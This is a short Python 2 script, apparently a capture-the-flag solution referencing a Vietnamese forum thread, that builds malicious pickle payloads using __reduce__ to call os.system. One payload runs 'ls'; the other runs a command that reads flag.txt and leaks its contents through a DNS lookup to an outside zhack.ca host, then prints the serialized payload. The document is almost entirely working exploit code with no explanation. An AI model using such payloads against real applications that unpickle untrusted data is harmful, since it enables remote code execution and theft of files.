'''#!/usr/bin/env python
import pickle
import os
class Exploit(object):
	def __reduce__(self):
		return (os.system, ('ls',))
		#note = Note("name", "date", "content")

with open("save.pickle", 'wb') as f:
	pickle.dump(Exploit(), f, protocol=0)'''

# https://whitehat.vn/threads/cho-chau-hoi-bai-misc06-trong-play-2.10970/

import pickle
import os

cmd = "host $(cat flag.txt).7443f6ddf02134d1d443.d.zhack.ca "

class ex(object):
	def __reduce__(self):
		return (os.system,(cmd,))

print pickle.dumps(ex())
